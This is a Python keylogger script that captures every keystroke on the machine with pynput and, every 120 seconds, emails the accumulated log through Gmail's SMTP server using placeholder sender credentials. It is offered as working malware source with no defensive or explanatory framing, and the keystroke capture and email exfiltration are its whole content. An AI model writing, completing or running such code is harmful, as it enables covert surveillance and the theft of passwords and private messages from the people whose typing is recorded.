#! /usr/bin/evn python
import pynput
import threading
import smtplib


class Keylogger:

    def __init__(self, time_interval, smtp_server_name, smtp_server_port, sender_email, password):
        self.log = ""
        self.intetval = time_interval
        self.sender_email = sender_email
        self.password = password
        self.smtp_server_name = smtp_server_name
        self.smtp_server_port = smtp_server_port

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            else:
                self.log = " " + self.log + str(key) + " "

    def report(self):
        self.sent_mail(self.sender_email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.intetval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def sent_mail(self, email, password, message):
        server = smtplib.SMTP(self.smtp_server_name, self.smtp_server_port)
        server.starttls()
        server.login(email, password)
        print("login done")
        server.sendmail(email, email, message)
        server.quit()


time_interval = 120  # email sent time interval
smtp_server_name = "smtp.gmail.com"  # SMTP server name
smtp_server_port = 587  # SMTP server port
email = "abc@xyz.com"  # Email address
password = "*********"  # Email password
keylogger = Keylogger(time_interval, smtp_server_name, smtp_server_port, email, password)
keylogger.start()
